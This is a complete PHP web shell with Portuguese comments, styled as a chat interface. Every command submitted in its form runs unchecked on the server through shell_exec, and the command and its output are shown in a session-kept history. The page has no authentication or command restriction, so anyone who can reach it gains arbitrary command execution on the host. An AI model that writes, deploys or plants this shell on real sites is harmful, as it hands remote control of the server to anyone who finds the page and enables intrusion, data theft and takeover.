<?php
session_start();

// Inicializa histórico se não existir
if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = [];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = trim($_POST['command']);
    if ($command !== '') {
        $output = shell_exec($command . ' 2>&1');
        $_SESSION['history'][] = [
            'command' => $command,
            'output' => $output ?: '[sem saída]'
        ];
    }
    // Redireciona para evitar reenvio em refresh
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Terminal via PHP (Chat Style)</title>
    <style>
        body {
            margin: 0; padding: 0;
            font-family: monospace;
            background: #121212;
            color: #eee;
            display: flex;
            flex-direction: column;
            height: 100vh;
        }
        .chat-box {
            flex-grow: 1;
            padding: 20px;
            overflow-y: auto;
        }
        .message {
            max-width: 90%;
            margin-bottom: 10px;
            padding: 10px 15px;
            border-radius: 10px;
            white-space: pre-wrap;
            grid-column: 1;
            display: grid;
        }
        .user {
            align-self: flex-end;
            background: #0f62fe;
            color: white;
            text-align: right;
        }
        .system {
            align-self: flex-start;
            background: #262626;
            color: #0f0;
        }
        form {
            display: flex;
            border-top: 1px solid #333;
            padding: 10px;
            background: #1e1e1e;
        }
        input[type="text"] {
            flex: 1;
            padding: 10px;
            font-size: 16px;
            background: #000;
            color: #0f0;
            border: none;
            outline: none;
        }
        button {
            padding: 10px 20px;
            background: #0f62fe;
            color: white;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="chat-box" id="chatBox">
    <?php foreach ($_SESSION['history'] as $entry): ?>
        <div class="message user"><?php echo htmlspecialchars($entry['command']); ?></div>
        <div class="message system"><?php echo htmlspecialchars($entry['output']); ?></div>
    <?php endforeach; ?>
</div>

<form method="post">
    <input type="text" name="command" placeholder="Digite um comando..." autofocus autocomplete="off" />
    <button type="submit">Enviar</button>
</form>

<script>
    // Scroll automático para o fim
    const chatBox = document.getElementById('chatBox');
    chatBox.scrollTop = chatBox.scrollHeight;
</script>

</body>
</html>
